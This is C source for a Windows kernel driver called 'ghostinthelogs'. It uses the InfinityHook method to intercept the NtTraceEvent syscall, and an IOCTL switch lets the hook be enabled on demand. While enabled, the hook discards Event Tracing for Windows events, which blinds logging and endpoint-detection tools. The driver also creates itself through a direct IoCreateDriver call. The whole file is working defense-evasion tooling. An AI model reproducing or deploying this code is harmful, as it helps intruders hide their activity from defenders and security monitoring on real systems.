#include "stdafx.h"
#include "entry.h"
#include "infinityhook.h"

#include <WinError.h>
#include <WinDef.h>
#include <stdio.h>
#include <ntddk.h>

static UNICODE_STRING StringNtTraceEvent = RTL_CONSTANT_STRING(L"NtTraceEvent");
static UNICODE_STRING StringIoCreateDriver = RTL_CONSTANT_STRING(L"IoCreateDriver");
static NtTraceEvent_t OriginalNtTraceEvent = NULL;
static IoCreateDriver_t OriginalIoCreateDriver = NULL;

DWORD HOOK_STATUS = 0;

NTSTATUS DevioctlDispatch(
	_In_ struct _DEVICE_OBJECT* DeviceObject,
	_Inout_ struct _IRP* Irp
)
{

	NTSTATUS				status = STATUS_SUCCESS;
	PIO_STACK_LOCATION   	stack;
	ULONG					bytesIO = 0;

	UNREFERENCED_PARAMETER(DeviceObject);

	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[i] DevioctlDispatch been hit\r\n");

	stack = IoGetCurrentIrpStackLocation(Irp);

	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[i] Control Code: 0x%x\r\n", stack->Parameters.DeviceIoControl.IoControlCode);

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case METHOD_ENABLE_HOOK:
		DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[i] METHOD_ENABLE_HOOK\r\n");

		HOOK_STATUS = 1;

		Irp->AssociatedIrp.SystemBuffer = (PVOID)1;
		Irp->IoStatus.Information = sizeof((PVOID)1);

		break;

	case METHOD_DISABLE_HOOK:
		DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[i] METHOD_DISABLE_HOOK\r\n");

		HOOK_STATUS = 0;

		Irp->AssociatedIrp.SystemBuffer = (PVOID)0;
		Irp->IoStatus.Information = sizeof((PVOID)0);

		break;

	case METHOD_STATUS_HOOK:
		DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[i] METHOD_STATUS_HOOK\r\n");

		Irp->AssociatedIrp.SystemBuffer = (PVOID)'A';
		Irp->IoStatus.Information = HOOK_STATUS;

		break;

	default:
		break;
	}

	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[i] hit the end\r\n");

	Irp->IoStatus.Status = status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return status;
}

NTSTATUS CreateDispatch(
	_In_ struct _DEVICE_OBJECT* DeviceObject,
	_Inout_ struct _IRP* Irp
)
{
	NTSTATUS status = Irp->IoStatus.Status;
	UNREFERENCED_PARAMETER(DeviceObject);

	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[i] CreateDispatch been hit with status: 0x%X\r\n", status);

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS UnsupportedDispatch(
	_In_ struct _DEVICE_OBJECT* DeviceObject,
	_Inout_ struct _IRP* Irp
)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_NOT_SUPPORTED;
}

NTSTATUS CloseDispatch(
	_In_ struct _DEVICE_OBJECT* DeviceObject,
	_Inout_ struct _IRP* Irp
)
{
	NTSTATUS status = Irp->IoStatus.Status;
	UNREFERENCED_PARAMETER(DeviceObject);

	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[i] CloseDispatch been hit with status: 0x%X\r\n", status);

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS DriverInitialize(
	_In_  struct _DRIVER_OBJECT* DriverObject,
	_In_  PUNICODE_STRING RegistryPath
)
{
	NTSTATUS        status;
	UNICODE_STRING  SymLink, DevName;
	PDEVICE_OBJECT  devobj;
	ULONG           t;

	UNREFERENCED_PARAMETER(RegistryPath);

	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[i] DriverObject Declared\r\n");

	RtlInitUnicodeString(&DevName, L"\\Device\\ghostinthelogs");
	status = IoCreateDevice(DriverObject, 0, &DevName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, TRUE, &devobj);

	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[i] Called IoCreateDevice status: 0x%X\r\n", status);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[-] IoCreateDevice failed :(\r\n");
		return status;
	}

	RtlInitUnicodeString(&SymLink, L"\\DosDevices\\ghostinthelogs");
	status = IoCreateSymbolicLink(&SymLink, &DevName);

	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[+] Called IoCreateSymbolicLink status: 0x%X\n", status);

	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[i] Called IoCreateSymbolicLink status: 0x%x\r\n", status);

	for (t = 0; t <= IRP_MJ_MAXIMUM_FUNCTION; t++)
	{
		DriverObject->MajorFunction[t] = &UnsupportedDispatch;
	}

	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = &DevioctlDispatch;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = &CreateDispatch;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = &CloseDispatch;
	DriverObject->DriverUnload = NULL;

	devobj->Flags &= ~DO_DEVICE_INITIALIZING;
	return status;
}

NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS        status;
	UNICODE_STRING  drvName;

	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[+] infinityhook: Loaded.\r\n");

	OriginalNtTraceEvent = (NtTraceEvent_t)MmGetSystemRoutineAddress(&StringNtTraceEvent);
	OriginalIoCreateDriver = (IoCreateDriver_t)MmGetSystemRoutineAddress(&StringIoCreateDriver);

	if (!OriginalIoCreateDriver)
	{
		DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[-] infinityhook: Failed to locate export: %wZ.\n", StringIoCreateDriver);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	if (!OriginalNtTraceEvent)
	{
		DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[-] infinityhook: Failed to locate export: %wZ.\n", StringNtTraceEvent);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	RtlInitUnicodeString(&drvName, L"\\Driver\\ghostinthelogs");
	status = OriginalIoCreateDriver(&drvName, &DriverInitialize);

	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[+] Called OriginalIoCreateDriver status: 0x%X\n", status);

	NTSTATUS Status = IfhInitialize(SyscallStub);
	if (!NT_SUCCESS(Status))
	{
		DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL, "[-] infinityhook: Failed to initialize with status: 0x%lx.\n", Status);
	}

	return Status;
}

void __fastcall SyscallStub(
	_In_ unsigned int SystemCallIndex,
	_Inout_ void** SystemCallFunction)
{
	UNREFERENCED_PARAMETER(SystemCallIndex);

	if (*SystemCallFunction == OriginalNtTraceEvent)
	{
		*SystemCallFunction = DetourNtTraceEvent;
	}
}

NTSTATUS DetourNtTraceEvent(
	_In_ PHANDLE TraceHandle,
	_In_ ULONG Flags,
	_In_ ULONG FieldSize,
	_In_ PVOID Fields)
{

	if (HOOK_STATUS == 0)
	{
		return OriginalNtTraceEvent(TraceHandle, Flags, FieldSize, Fields);
	}

	return STATUS_SUCCESS;
}